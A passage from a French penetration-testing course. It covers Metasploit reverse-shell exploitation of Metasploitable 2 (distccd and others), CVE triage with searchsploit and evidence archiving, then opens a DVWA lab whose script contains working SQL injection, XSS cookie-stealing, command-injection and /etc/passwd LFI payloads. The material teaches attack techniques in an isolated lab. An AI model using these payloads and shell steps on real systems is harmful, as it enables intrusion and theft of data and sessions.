- `use exploit/unix/misc/distcc_exec` : charge le module qui exploite l'exécution de commandes de `distccd`.
- `set RHOSTS 192.168.56.103` : fixe l'adresse de Metasploitable 2.
- `set RPORT 3632` : fixe le port du service `distccd`.
- `set LHOST 192.168.56.101` : fixe l'adresse d'écoute.
- `set LPORT 4448` : fixe le port d'écoute et évite les conflits avec les autres modules.
- `set payload cmd/unix/reverse` : charge un shell Unix reverse.
- `exploit -z` : lance l'exploit et met la session en arrière-plan.
- `sleep 6` : laisse le temps au shell de revenir.
- `sessions -l` : inventorie la session.
- `sessions -c "id; hostname; uname -a"` : exécute les commandes de preuve.
- `sessions -K` : ferme la session ; aucune persistance.
- `exit -y` : quitte Metasploit.
- Piège courant : chercher à élever le shell `daemon` en root dans ce lab. L'élévation locale relève de T1068 et du chapitre 3, avec snapshot et validation.

**Résultat attendu**

```text
[*] Started reverse TCP double handler on 192.168.56.101:4448
[*] Command shell session 1 opened (192.168.56.101:4448 -> 192.168.56.103:33309) at 2026-11-16 18:02:23 +0100
...
uid=1(daemon) gid=1(daemon) groups=1(daemon)
metasploitable
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
# rc=0
```

**Lecture** — `distccd` est lancé avec l'utilisateur `daemon`. Le résultat `uid=1(daemon)` est correct et ne doit pas être présenté comme un échec. Il illustre la différence entre une exécution de commande et une élévation de privilèges.

**Preuve** — `preuves/ch1-lab7/exploitation/msf-distcc.txt`.

#### Étape 7 — Exécuter les quatre scripts en série

**But** — produire un jeu de preuves homogène en exécutant les quatre modules dans l'ordre, sans masquer un échec.

**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.

**Prérequis** — quatre preuves individuelles obtenues aux étapes 3 à 6 ; runner `run-cve.sh` présent.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali/preuves/ch1-lab7/exploitation`

**Exemple de commande**

```bash
prouve run-all.txt bash run-cve.sh
grep -H '^# rc=' msf-*.txt
```

**Explication de la commande**

- `prouve run-all.txt` : enregistre la console complète du runner et son code retour.
- `bash run-cve.sh` : exécute le runner, qui boucle sur vsftpd, samba, unreal et distcc.
- Le runner appelle `prouve` et `timeout 180` pour chaque module.
- `|| true` dans le runner : un échec de module n'arrête pas les suivants.
- `grep -H '^# rc='` : affiche le code retour de chaque preuve avec le nom du fichier.
- `-H` : préfixe chaque ligne par le chemin du fichier.
- `msf-*.txt` : les quatre preuves individuelles.
- Piège courant : lire uniquement le `# rc=0` final de `run-all.txt` et ignorer un `msf-*.txt` en échec ; lisez les quatre fichiers.

**Résultat attendu**

```text
/home/kali/preuves/ch1-lab7/exploitation/msf-vsftpd.txt:# rc=0
/home/kali/preuves/ch1-lab7/exploitation/msf-samba.txt:# rc=0
/home/kali/preuves/ch1-lab7/exploitation/msf-unreal.txt:# rc=0
/home/kali/preuves/ch1-lab7/exploitation/msf-distcc.txt:# rc=0
# rc=0
```

Le fichier `run-all.txt` conserve la console complète ; les fichiers `msf-*.txt` sont les preuves individuelles. Si un module échoue, le runner continue et le `grep` final montre le `# rc` de chaque preuve : lisez le fichier en échec avant de conclure.

**Preuve** — `preuves/ch1-lab7/exploitation/run-all.txt`.

#### Étape 8 — Qualifier les 12 CVE

**But** — vérifier la présence de chaque CVE dans la base Exploit-DB et documenter les quatre abouties et les huit non abouties.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — preuves des étapes 3 à 7 ; base Exploit-DB locale.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

Bloc A — enregistrer une preuve par CVE :

```bash
cd ~/preuves/ch1-lab7
for cve in CVE-2011-2523 CVE-2007-2447 CVE-2010-2075 CVE-2004-2687 CVE-2010-4221 CVE-2011-3192 CVE-2012-1823 CVE-2008-0166 CVE-2008-0600 CVE-2008-0010 CVE-2008-0009 CVE-2021-4158; do
  prouve "cve-$cve.txt" searchsploit --disable-colour --cve "$cve" || true
done
```

Bloc B — enregistrer le compteur :

```bash
prouve qualification-cve.txt bash -c '
for cve in CVE-2011-2523 CVE-2007-2447 CVE-2010-2075 CVE-2004-2687 CVE-2010-4221 CVE-2011-3192 CVE-2012-1823 CVE-2008-0166 CVE-2008-0600 CVE-2008-0010 CVE-2008-0009 CVE-2021-4158; do
  printf "%s: " "$cve"
  grep -c "Exploit Title" "cve-$cve.txt" || true
done
'
```

**Explication de la commande**

- `cd ~/preuves/ch1-lab7` : place le shell dans le répertoire des preuves ; les fichiers `cve-CVE-*.txt`, `qualification-cve.txt` et `resultats-cve-v3.csv` y sont écrits.
- `for cve in ...; do ... done` : boucle sur les douze codes CVE, un par un.
- `prouve "cve-$cve.txt"` : enregistre la sortie de la commande dans le fichier `cve-CVE-....txt` et y ajoute les lignes `# date:`, `# cmd:` et `# rc=` ; le préfixe `cve-` et le suffixe `.txt` sont concaténés au code de la CVE.
- `searchsploit --disable-colour --cve "$cve"` : interroge la base Exploit-DB locale sur les métadonnées de la CVE.
- `--disable-colour` : supprime les séquences ANSI de la sortie pour garder une preuve lisible.
- `--cve "$cve"` : recherche le code CVE complet, préfixe `CVE-` compris, dans les métadonnées de la base.
- `|| true` : neutralise le code retour non nul de `searchsploit` lorsqu'aucun résultat n'est trouvé ; la boucle continue et les CVE suivantes sont traitées.
- Dans le bloc B, `prouve qualification-cve.txt` : enregistre la console du compteur et son code retour dans `qualification-cve.txt`.
- `bash -c '...'` : exécute la boucle de comptage dans un shell enfant ; les guillemets simples protègent le script des expansions du shell appelant.
- `printf "%s: " "$cve"` : affiche le code CVE sans retour à la ligne, pour que le compteur apparaisse sur la même ligne.
- `grep -c "Exploit Title" "cve-$cve.txt"` : compte les lignes `Exploit Title` dans le fichier de preuve de la CVE.
- Second `|| true` : neutralise le code retour 1 de `grep -c` quand le compte est zéro ; sans lui, la dernière itération de `bash -c` retournerait 1 et `qualification-cve.txt` afficherait `# rc=1` au lieu de `# rc=0`.
- Piège courant : `grep 'No Results'` peut matcher `Shellcodes: No Results` et faire croire à tort qu'une CVE est absente. Comptez le bloc `Exploit Title` ou lisez le fichier `cve-*.txt`.

**Résultat attendu**

```text
CVE-2011-2523: 1
CVE-2007-2447: 1
CVE-2010-2075: 1
CVE-2004-2687: 1
CVE-2010-4221: 1
CVE-2011-3192: 1
CVE-2012-1823: 1
CVE-2008-0166: 1
CVE-2008-0600: 1
CVE-2008-0010: 1
CVE-2008-0009: 1
CVE-2021-4158: 0
# rc=0
```

Onze lignes avec `1` et une ligne avec `0` (`CVE-2021-4158`, CVE QEMU hôte hors Exploit-DB). Chaque fichier `cve-CVE-*.txt` contient la sortie `searchsploit` et son propre `# rc=` ; la dernière preuve, `qualification-cve.txt`, se termine par `# rc=0`.

**Tableau de qualification**

| CVE | Service / version | Statut dans ce lab | Preuve | Justification |
|---|---|---|---|---|
| CVE-2011-2523 | vsftpd 2.3.4 | Exploitée | `exploitation/msf-vsftpd.txt` | shell root via `6200/tcp` |
| CVE-2007-2447 | Samba 3.0.20 | Exploitée | `exploitation/msf-samba.txt` | shell root via reverse TCP |
| CVE-2010-2075 | UnrealIRCd 3.2.8.1 | Exploitée | `exploitation/msf-unreal.txt` | shell root via reverse TCP |
| CVE-2004-2687 | distccd v1 | Exploitée | `exploitation/msf-distcc.txt` | shell `daemon`, pas root |
| CVE-2010-4221 | ProFTPD 1.3.1 | Non exploitée — rejetée | `cve-CVE-2010-4221.txt` | version cible hors plage ; CVE rejetée dans la matrice |
| CVE-2011-3192 | Apache 2.2.8 | Non exploitée — DoS interdit | `cve-CVE-2011-3192.txt` | déni de service hors périmètre |
| CVE-2012-1823 | PHP 5.2.4 | Non exploitée — conditionnelle | `cve-CVE-2012-1823.txt` | `/cgi-bin/` retourne 403 ; pas de configuration CGI exploitable |
| CVE-2008-0166 | OpenSSL 0.9.8g | Non exploitée — version | `cve-CVE-2008-0166.txt` | validation de version ; pas de clé privée exploitable |
| CVE-2008-0600 | noyau 2.6.24 | Non testée — privesc local | `cve-CVE-2008-0600.txt` | candidat local ; root déjà obtenu par vsftpd/Samba/Unreal |
| CVE-2008-0010 | noyau 2.6.24 | Non testée — privesc local | `cve-CVE-2008-0010.txt` | candidat local ; hors objectif du lab |
| CVE-2008-0009 | noyau 2.6.24 | Non testée — privesc local | `cve-CVE-2008-0009.txt` | candidat local ; hors objectif du lab |
| CVE-2021-4158 | QEMU hôte 6.0–6.x | Hors périmètre | `cve-CVE-2021-4158.txt` | CVE QEMU/ACPI (DoS hôte) ; ni Metasploitable 2 ni VirtualBox ; non testée |

**Lecture** — quatre CVE sont **abouties** : une session a été obtenue et une commande a été exécutée (`# rc=0`). Huit CVE sont **non abouties** dans ce périmètre, avec une justification vérifiable : version hors plage, DoS interdit, configuration CGI absente, validation de version seule, privesc local non testé et CVE hôte hors périmètre. Les 11 CVE cibles sont présentes dans la base Exploit-DB de Kali ; la douzième, `CVE-2021-4158`, est une CVE QEMU/ACPI qui ne concerne ni Metasploitable 2 ni VirtualBox et ne doit pas être testée (DoS). Le lab documente l'exception au lieu de forcer une conclusion. Les CVE non exécutées sont des décisions de périmètre ou de configuration, pas des oublis.

**Écrire le CSV de synthèse**

Le tableau de qualification est ensuite écrit dans un fichier CSV, source unique pour le rapport et pour la mise à jour de la matrice de risques.

**Exemple de commande**

```bash
cat > resultats-cve-v3.csv <<'CSV'
cible,vecteur,cve,module_ou_commande,statut,preuve,resultat,limite
192.168.56.103,ftp,CVE-2011-2523,exploit/unix/ftp/vsftpd_234_backdoor,exploitee,exploitation/msf-vsftpd.txt,shell root via 6200/tcp,aucune
192.168.56.103,smb,CVE-2007-2447,exploit/multi/samba/usermap_script,exploitee,exploitation/msf-samba.txt,shell root via reverse TCP,aucune
192.168.56.103,irc,CVE-2010-2075,exploit/unix/irc/unreal_ircd_3281_backdoor,exploitee,exploitation/msf-unreal.txt,shell root via reverse TCP,aucune
192.168.56.103,distcc,CVE-2004-2687,exploit/unix/misc/distcc_exec,exploitee,exploitation/msf-distcc.txt,shell daemon,privileges non root
192.168.56.103,ftp,CVE-2010-4221,searchsploit --cve,non_exploitee,cve-CVE-2010-4221.txt,version hors plage,CVE rejetee
192.168.56.103,http,CVE-2011-3192,searchsploit --cve,non_exploitee,cve-CVE-2011-3192.txt,DoS interdit,hors perimetre
192.168.56.103,http,CVE-2012-1823,searchsploit --cve,non_exploitee,cve-CVE-2012-1823.txt,CGI 403,conditionnelle
192.168.56.103,ssl,CVE-2008-0166,searchsploit --cve,non_exploitee,cve-CVE-2008-0166.txt,validation de version,aucune cle exploitable
192.168.56.103,noyau,CVE-2008-0600,searchsploit --cve,non_testee,cve-CVE-2008-0600.txt,privesc local,non testee
192.168.56.103,noyau,CVE-2008-0010,searchsploit --cve,non_testee,cve-CVE-2008-0010.txt,privesc local,non testee
192.168.56.103,noyau,CVE-2008-0009,searchsploit --cve,non_testee,cve-CVE-2008-0009.txt,privesc local,non testee
192.168.56.1,hote,CVE-2021-4158,searchsploit --cve,hors_perimetre,cve-CVE-2021-4158.txt,DoS hote,ni Metasploitable 2 ni VirtualBox
CSV
head -1 resultats-cve-v3.csv
wc -l resultats-cve-v3.csv
awk -F, 'NR>1 {print $5}' resultats-cve-v3.csv | sort | uniq -c
```

**Explication de la commande**

- `cat > resultats-cve-v3.csv <<'CSV'` : écrit le fichier CSV depuis l'entrée standard, dans le répertoire courant `~/preuves/ch1-lab7`.
- `<<'CSV'` : heredoc avec le délimiteur `CSV` ; les guillemets empêchent l'expansion du shell.
- `>` : écrase un éventuel fichier précédent au lieu de l'ajouter.
- Les douze lignes suivantes : une ligne par CVE, avec les colonnes `cible`, `vecteur`, `cve`, `module_ou_commande`, `statut`, `preuve`, `resultat` et `limite`.
- `head -1 resultats-cve-v3.csv` : affiche uniquement l'en-tête, pour vérifier l'ordre des colonnes.
- `wc -l resultats-cve-v3.csv` : compte les lignes, en-tête compris ; la valeur attendue est `13`.
- `awk -F, 'NR>1 {print $5}'` : découpe chaque ligne sur la virgule, ignore l'en-tête et affiche la cinquième colonne, `statut`.
- `| sort | uniq -c` : trie les statuts et compte les occurrences de chaque valeur.
- Piège courant : une virgule dans un champ décale les colonnes ; les champs `resultat` et `limite` ne doivent contenir aucune virgule.

**Résultat attendu**

```text
cible,vecteur,cve,module_ou_commande,statut,preuve,resultat,limite
13 resultats-cve-v3.csv
4 exploitee
1 hors_perimetre
4 non_exploitee
3 non_testee
```

Le compteur confirme 12 lignes de données : 4 `exploitee`, 4 `non_exploitee`, 3 `non_testee` et 1 `hors_perimetre`. L'ordre exact des compteurs après `sort` peut varier.

**Preuve** — `preuves/ch1-lab7/cve-CVE-*.txt` (12 fichiers), `preuves/ch1-lab7/qualification-cve.txt` et `preuves/ch1-lab7/resultats-cve-v3.csv` (12 lignes de données).

#### Étape 9 — Archiver les preuves sur l'hôte

**But** — copier les preuves de Kali vers l'hôte et vérifier leur intégrité par empreinte SHA-256.

**Machine** — hôte (hyperviseur).

**Prérequis** — preuves des étapes 1 à 8 présentes sur Kali ; accès SSH à Kali.

> **Machine** : hôte (192.168.56.1) | **Terminal** : terminal local | **Utilisateur** : votre compte | **Répertoire** : racine du projet `hacking-contre-mesure-niveau-2`

**Exemple de commande**

```bash
mkdir -p preuves/ch1-lab7
scp -r kali@192.168.56.101:/home/kali/preuves/ch1-lab7/. preuves/ch1-lab7/
find preuves/ch1-lab7 -type f ! -name SHA256SUMS -print0 | sort -z | xargs -0 sha256sum > preuves/ch1-lab7/SHA256SUMS
sha256sum -c preuves/ch1-lab7/SHA256SUMS
```

**Explication de la commande**

- `mkdir -p preuves/ch1-lab7` : crée le répertoire d'archivage sur l'hôte.
- `scp -r kali@192.168.56.101:/home/kali/preuves/ch1-lab7/. preuves/ch1-lab7/` : copie récursivement le contenu du répertoire distant.
- `find preuves/ch1-lab7 -type f` : liste les fichiers réguliers.
- `! -name SHA256SUMS` : exclut le fichier de sommes lui-même.
- `-print0` : sépare les noms par un octet nul.
- `sort -z` : trie les noms avec le séparateur nul.
- `xargs -0 sha256sum` : calcule les empreintes sans casser les noms contenant des espaces.
- `> preuves/ch1-lab7/SHA256SUMS` : écrit le fichier de sommes.
- `sha256sum -c` : vérifie chaque fichier ; `OK` signifie que l'empreinte correspond.
- Piège courant : archiver sans `SHA256SUMS` ou modifier une preuve après le calcul ; l'archive n'est plus vérifiable.

**Résultat attendu**

Une suite de `OK` pour chaque fichier.

Le fichier `preuves/ch1-lab7/resultats-cve-v3.csv` reprend les 12 lignes du tableau avec les colonnes `cible,vecteur,cve,module_ou_commande,statut,preuve,resultat,limite`. Il sert de source pour le rapport et pour la mise à jour de la matrice de risques.

**Preuve** — `preuves/ch1-lab7/SHA256SUMS` et `preuves/ch1-lab7/resultats-cve-v3.csv`.

#### Étape 10 — Revenir à l'état de référence

**But** — restaurer le snapshot `avant-exploitation` et vérifier que les quatre services sont revenus et que `6200/tcp` est fermé.

**Machine** — Kali `192.168.56.101` vers Metasploitable 2 `192.168.56.103`.

**Prérequis** — snapshot `avant-exploitation` restauré depuis l'interface VirtualBox de l'hôte.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
prouve post-rollback.txt bash -c 'ping -c 2 192.168.56.103; for p in 21 445 6667 3632; do nc -zv 192.168.56.103 "$p"; done; if nc -zv 192.168.56.103 6200; then echo "6200 OPEN"; exit 1; else echo "6200 CLOSED"; fi'
```

**Explication de la commande**

- `prouve post-rollback.txt` : enregistre le contrôle de retour à l'état de référence.
- `bash -c '...'` : exécute la séquence dans un shell enfant.
- `ping -c 2 192.168.56.103` : confirme que la cible répond après le rollback.
- `for p in 21 445 6667 3632; do ... done` : boucle sur les quatre services attendus.
- `nc -zv 192.168.56.103 "$p"` : vérifie l'ouverture de chaque service.
- `if nc -zv 192.168.56.103 6200; then ... fi` : teste le port de la backdoor.
- `echo "6200 OPEN"; exit 1` : signale un état non conforme et fait échouer la preuve.
- `else echo "6200 CLOSED"` : confirme la fermeture du port.
- Piège courant : lancer `VBoxManage` depuis Kali ; la gestion des VM est réservée à l'hôte.

**Résultat attendu**

```text
2 packets transmitted, 2 received, 0% packet loss, time 1027ms
(UNKNOWN) [192.168.56.103] 21 (ftp) open
(UNKNOWN) [192.168.56.103] 445 (microsoft-ds) open
(UNKNOWN) [192.168.56.103] 6667 (ircd) open
(UNKNOWN) [192.168.56.103] 3632 (distcc) open
(UNKNOWN) [192.168.56.103] 6200 (?) : Connection refused
6200 CLOSED
# rc=0
```

Si `6200` est encore ouvert, attendez la fin du processus ou restaurez à nouveau le snapshot. Ne poursuivez pas vers le Lab-08 avec un état de cible incertain.

**Preuve** — `preuves/ch1-lab7/exploitation/post-rollback.txt`.

### En conclusion

Ce lab a démontré, sur la cible isolée `192.168.56.103`, l'aboutissement de quatre CVE : vsftpd 2.3.4 (CVE-2011-2523), Samba 3.0.20 (CVE-2007-2447), UnrealIRCd 3.2.8.1 (CVE-2010-2075) et distccd v1 (CVE-2004-2687). Trois sessions ont donné `uid=0(root)` ; distcc a donné `uid=1(daemon)`. Chaque résultat est daté, associé à une commande, à une sortie et à `# rc=0`. Les huit autres CVE sont qualifiées avec leur limite : version hors plage, DoS interdit, CGI non exploitable, privesc local non testé ou absence dans Kali.

Dans la chaîne d'exploitation, ce lab se situe après la reconnaissance (Lab-05), la validation CVE (Lab-06) et la matrice de risques. Il transforme une **hypothèse validée par version** en **accès concret**. Le rollback `avant-exploitation` referme la chaîne : aucune session, persistance ou modification ne doit rester. Le Lab-08 applique la même logique à la couche web, avec SQLi, XSS et exfiltration.

**Critères de réussite**

- [ ] Les quatre preuves `msf-vsftpd.txt`, `msf-samba.txt`, `msf-unreal.txt` et `msf-distcc.txt` existent et contiennent `# rc=0`.
- [ ] Chaque preuve contient une session ouverte et la sortie de `id; hostname; uname -a`.
- [ ] vsftpd, Samba et UnrealIRCd donnent `uid=0(root)` ; distcc donne `uid=1(daemon)`.
- [ ] Le script `vsftpd.rc` ne contient pas de commande `check` avant `exploit`.
- [ ] Les 12 CVE sont qualifiées à l'étape 8 de ce lab ; `CVE-2021-4158` est documentée comme CVE QEMU hôte hors périmètre.
- [ ] `preuves/ch1-lab7/resultats-cve-v3.csv` contient 12 lignes de données.
- [ ] Les preuves sont copiées sur l'hôte et `sha256sum -c` retourne `OK`.
- [ ] Le snapshot `avant-exploitation` est restauré ; `6200/tcp` est fermé ; les quatre services sont revenus.
- [ ] Aucune persistance, aucun déni de service, aucune force brute, aucune cible hors `192.168.56.0/24`.

## Lab-08 — Exploitation web DVWA : SQLi, XSS et exfiltration

### Énoncé / Contexte

Le Lab-05 a identifié DVWA sur `http://192.168.56.103/dvwa`. Ce lab transforme cette découverte en **exploitation web**. Il couvre cinq vulnérabilités applicatives et deux formes d'exfiltration :

- injection SQL (SQLi) avec lecture de la base `dvwa` ;
- XSS réfléchi ;
- XSS stocké ;
- injection de commande via le formulaire `ping` ;
- inclusion de fichier local (LFI) ;
- exfiltration de données par SQLi (`users`) ;
- exfiltration du cookie de session par XSS, dans un navigateur réel.

**Place dans la chaîne** — après l'exploitation réseau (Lab-07) et l'énumération web (Lab-05), avant le rollback et la synthèse. C'est la phase d'aboutissement applicatif : accès aux données, exécution JavaScript et exfiltration.

**Objectif** — produire, pour chaque vulnérabilité, une commande reproductible, une sortie réelle et une preuve `prouve`, sans force brute et sans modification destructive. Le lab utilise le niveau de sécurité `low` de DVWA, avec le compte de laboratoire `admin` / `password`. Ce compte est un identifiant de lab, pas un compte réel.

**Ce que vous devez obtenir** — les preuves `01-login.txt` à `12-xss-browser.txt`, la preuve de suite `00-suite.txt`, et le fichier `resultats-web.csv`. La preuve navigateur doit montrer une requête de callback contenant le cookie `PHPSESSID`, ce qui distingue une simple réflexion HTML d'une exécution JavaScript réelle.

> **Périmètre** — Kali `192.168.56.101` vers DVWA sur Metasploitable 2 `192.168.56.103`. Aucune cible externe. Tous les exploits web sont exécutés sans limitation, avec écriture dans la base limitée au guestbook DVWA nécessaire au test XSS stocké. Restaurez le snapshot `avant-exploitation` après le lab.

**Pourquoi le niveau `low`** — DVWA est conçu pour être vulnérable. Le niveau `low` supprime les protections d'entrée et de sortie. Le lab ne prétend pas que ces vulnérabilités existent avec la même facilité en production ; il montre le mécanisme, la preuve et la contre-mesure.

**Plan MITRE ATT&CK**

| Élément | Valeur |
|---|---|
| Tactique | Initial Access (TA0001), Execution (TA0002), Collection (TA0009), Exfiltration (TA0010) |
| Technique | T1190 Exploit Public-Facing Application, T1059.007 JavaScript/JScript, T1059.004 Unix Shell, T1005 Data from Local System, T1213 Data from Information Repositories, T1048 Exfiltration Over Alternative Protocol, T1539 Steal Web Session Cookie |
| Procédure | `curl`, `sqlmap`, Selenium/Chromium contre DVWA `low` |
| Source de données | Requêtes HTTP, journaux SQLmap, réponses HTML, callback HTTP sur Kali `8000/tcp`, sortie `id` |
| Détection | Mots-clés SQL dans les paramètres, user-agent SQLmap, payloads `<script>`, lecture de `/etc/passwd`, requête sortante vers Kali `8000/tcp`, processus `www-data` |
| Mitigation | Requêtes préparées, validation et encodage de sortie, CSP, cookies `HttpOnly` et `Secure`, allowlist de fichiers, moindre privilège |
| Statut | Exécuté dans le lab, sur cible isolée |

> **Avenant ATT&CK** — ces techniques sont ajoutées au chapitre 1 par l'avenant A.7. T1190 et T1210 sont déjà cartographiés au chapitre 2/5 ; ce lab les exécute ici dans un cadre isolé, sans modifier le séquencement de référence des 24 labs.

**Prérequis**

- DVWA accessible : `curl -s -o /dev/null -w '%{http_code}\n' http://192.168.56.103/dvwa/login.php` retourne `200`.
- Compte `admin` / `password` et niveau `low`. Le script de login ci-dessous crée un cookie jar.
- Outils Kali : `curl`, `sqlmap`, `python3`, `selenium`, `chromium`, `chromedriver`, `prouve`.
- Si `selenium` ou `chromedriver` manque : `sudo apt install python3-selenium chromium-driver` (hors ligne si le dépôt local est disponible ; sinon, utilisez le test `curl` et documentez la limite).
- Port `8000/tcp` libre sur Kali pour le callback XSS. Vérifiez avec `ss -lntp | grep ':8000'`.
- Snapshot `avant-exploitation` de Metasploitable 2 ; le guestbook DVWA peut être modifié par le test XSS stocké, d'où la restauration finale.
- Répertoire de travail Kali : `~/preuves/ch1-lab8-v3`. Répertoire d'archivage hôte : `preuves/ch1-lab8-v3`.

### Outils et commandes utilisées

| Outil | Commande | Rôle |
|---|---|---|
| `curl` | `-c`, `-b`, `-d`, `-G`, `--data-urlencode` | Login, cookie jar, SQLi, XSS, commande, LFI |
| `sqlmap` | `--dbs`, `--tables`, `--dump`, `--answers=crack=N` | Détection et exfiltration SQL |
| `python3` | `xss-browser-test.py` | Automatisation du navigateur et du callback |
| Selenium / Chromium / chromedriver | `webdriver.Chrome`, `execute_script`, `get_cookies` | Exécution JavaScript réelle |
| `prouve` | `prouve 01-login.txt ...` | Preuve horodatée avec code retour |
| `ss` | `ss -lntp \| grep ':8000'` | Vérification du listener de callback |
| `scp` / `sha256sum` | Archivage et hachage | Intégrité des preuves |

### Commande et laboratoire étape par étape

#### Étape 1 — Vérifier l'état de départ

**But** — confirmer que DVWA répond, que le port de callback est libre et que les outils sont installés.

**Machine** — Kali `192.168.56.101` vers DVWA `192.168.56.103`.

**Prérequis** — snapshot `avant-exploitation` pris ; DVWA démarré.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

**Exemple de commande**

```bash
source ~/prouve.sh
prouve preuves/ch1-lab8-v3/00-prerequis.txt bash -c \
  'curl -s -o /dev/null -w "HTTP %{http_code}\n" http://192.168.56.103/dvwa/login.php; ss -lntp | grep ":8000" || true; command -v sqlmap; command -v python3; command -v chromium; command -v chromedriver'
```

**Explication de la commande**

- `source ~/prouve.sh` : charge la fonction `prouve`.
- `prouve ... 00-prerequis.txt` : enregistre le contrôle et son code retour.
- `bash -c '...'` : exécute la séquence dans un shell enfant.
- `curl -s -o /dev/null -w "HTTP %{http_code}\n"` : interroge la page de login sans afficher le corps et imprime le code HTTP.
- `ss -lntp | grep ":8000"` : vérifie qu'aucun processus n'écoute sur le port de callback.
- `|| true` : empêche l'absence de listener de faire échouer la preuve.
- `command -v sqlmap`, `python3`, `chromium`, `chromedriver` : vérifie la présence des outils dans le `PATH`.
- Piège courant : lancer le test navigateur avec un autre processus sur `8000/tcp` ; le callback échoue ou arrive au mauvais service.

**Résultat attendu**

`HTTP 200`, aucun listener sur `8000`, et les chemins de `sqlmap`, `python3`, `chromium`, `chromedriver`. Si `8000` est occupé, arrêtez le processus ou changez le port dans `xss-browser-test.py` et dans `CALLBACK`.

**Preuve** — `preuves/ch1-lab8-v3/00-prerequis.txt`.

#### Étape 2 — Préparer les scripts

**But** — créer les deux scripts du lab, vérifier leur syntaxe et calculer leurs empreintes avant exécution.

**Machine** — Kali `192.168.56.101`.

**Prérequis** — outils vérifiés à l'étape 1.

> **Machine** : Kali (192.168.56.101) | **Terminal** : SSH depuis l'hôte | **Utilisateur** : kali | **Répertoire** : `/home/kali`

Deux scripts suffisent : `web-tests.sh` pour les tests HTTP/SQLmap, et `xss-browser-test.py` pour l'exécution XSS dans Chromium avec callback.

**`web-tests.sh`** — login, niveau `low`, SQLi manuelle, XSS réfléchi/stocké, injection de commande, LFI, SQLmap `--dbs`, `--tables`, `--dump`.

```bash
#!/bin/bash
# web-tests.sh — chaîne d'exploitation web DVWA de Lab-08.
# Phase MITRE ATT&CK : T1190 (Exploit Public-Facing Application),
# T1059.004 (Unix Shell), T1005/T1213 (lecture de données),
# T1048 (exfiltration) et T1539 (vol de cookie, via le test navigateur).
# Le script suppose DVWA en niveau `low`, compte `admin`/`password`,
# et la fonction `prouve` disponible. Aucun brute force, aucun DoS.
set -u

# Charge la fonction de preuve et fixe les chemins du laboratoire.
source "$HOME/prouve.sh"
BASE="http://192.168.56.103/dvwa"
OUT="$HOME/preuves/ch1-lab8-v3"
COOKIE="$OUT/cookies.txt"
mkdir -p "$OUT"

# 01 — Login : conserve le cookie de session DVWA dans un cookie jar.
# `-D -` affiche les en-têtes ; `-c` écrit le jar ; `-b` le renvoie.
prouve "$OUT/01-login.txt" bash -c "curl -sS -D - -c '$COOKIE' -b '$COOKIE' -d 'username=admin&password=password&Login=Login' '$BASE/login.php' -o /tmp/dvwa-login-v3.html | grep -i -E 'HTTP/|Location|Set-Cookie'; grep -o 'PHPSESSID[^;]*' '$COOKIE'"

# 02 — Passage au niveau `low` : sans ce cookie, les protections DVWA
# filtrent les payloads et le test ne prouve pas la vulnérabilité.
prouve "$OUT/02-security-low.txt" bash -c "curl -sS -b '$COOKIE' -c '$COOKIE' -d 'security=low&seclev_submit=Submit' '$BASE/security.php' -o /tmp/dvwa-security-v3.html; grep -E 'security[[:space:]]+low' '$COOKIE'; grep -o 'Security Level:</b> [a-z]*' /tmp/dvwa-security-v3.html | head -1"

# 03 — SQLi manuelle : UNION SELECT sur deux colonnes, commentaire `#`
# pour neutraliser la fin de requête. La preuve est le bloc `<pre>`.
prouve "$OUT/03-sqli-union.txt" bash -c "curl -sS -b '$COOKIE' -G --data-urlencode \"id=1' UNION SELECT user,password FROM users#\" --data-urlencode 'Submit=Submit' '$BASE/vulnerabilities/sqli/' | grep -o '<pre>ID:.*</pre>' | head -5"

# 04 — XSS réfléchi : le payload doit apparaître non échappé dans la réponse.
prouve "$OUT/04-xss-reflected.txt" bash -c "curl -sS -b '$COOKIE' -G --data-urlencode 'name=<script>alert(document.cookie)</script>' '$BASE/vulnerabilities/xss_r/' | grep -o '<script>alert(document.cookie)</script>' | head -1"

# 05 — XSS stocké, soumission : le payload est écrit dans le guestbook DVWA.
prouve "$OUT/05-xss-stored-submit.txt" bash -c "curl -sS -b '$COOKIE' --data-urlencode \"txtName=<script>alert(1)</script>\" --data-urlencode 'mtxMessage=stored-xss-proof' --data-urlencode 'btnSign=Sign Guestbook' '$BASE/vulnerabilities/xss_s/' | grep -o '<script>alert(1)</script>' | head -1"

# 06 — XSS stocké, relecture : le payload est servi à nouveau par la page.
prouve "$OUT/06-xss-stored-view.txt" bash -c "curl -sS -b '$COOKIE' '$BASE/vulnerabilities/xss_s/' | grep -o '<script>alert(1)</script>' | head -1"

# 07 — Injection de commande : le formulaire `ping` concatène l'entrée
# dans une commande shell. `id` prouve l'utilisateur du serveur web.
prouve "$OUT/07-cmdi.txt" bash -c "curl -sS -b '$COOKIE' --data-urlencode 'ip=127.0.0.1; id; hostname; uname -a' --data-urlencode 'submit=submit' '$BASE/vulnerabilities/exec/' | sed -n '/<pre>/,/<\/pre>/p' | head -20"

# 08 — LFI : lecture de /etc/passwd par traversée de répertoire.
prouve "$OUT/08-lfi.txt" bash -c "curl -sS -b '$COOKIE' -G --data-urlencode 'page=../../../../../etc/passwd' '$BASE/vulnerabilities/fi/' | grep -E 'root:|msfadmin:' | head -2"

# 09-11 — SQLmap : reconstruit l'en-tête Cookie depuis le jar, puis
# énumère les bases, les tables de `dvwa`, et extrait les 5 comptes.
# `--answers=crack=N` empêche le crackage des hashes : la preuve est
# l'extraction, pas une attaque de mots de passe.
PHPSESSID=$(awk '$6=="PHPSESSID"{print $7}' "$COOKIE")
SECURITY=$(awk '$6=="security"{print $7}' "$COOKIE")
COOKIE_HEADER="PHPSESSID=$PHPSESSID; security=$SECURITY"
